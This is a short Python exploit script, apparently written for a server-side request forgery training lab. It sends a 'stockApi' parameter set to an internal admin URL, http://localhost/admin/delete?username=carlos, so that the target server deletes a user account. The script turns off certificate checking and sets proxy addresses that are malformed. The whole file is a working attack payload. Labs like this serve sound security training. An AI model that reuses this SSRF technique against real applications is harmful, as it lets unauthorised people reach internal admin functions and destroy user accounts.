import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http//127.0.0.1', 'https': 'http//127.0.0.1'}

def delete_user(url):
    delete_user_url_ssrf_payload = 'http://localhost/admin/delete?username=carlos'
    check_stock_path = '/product/stock'
    params = {'stockApi': delete_user_url_ssrf_payload}
    r = requests.post(url + check_stock_path, data=params, verify=False, proxies=proxies)


#function that checks if the site set correclty. It requires the program to be run by adding the python version, python file and the url.
#Example: python lab-01.py www.example.com
def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    print("(+) Deleting Carlos user..")
    delete_user(url)


if __name__ == "__main__":
    main()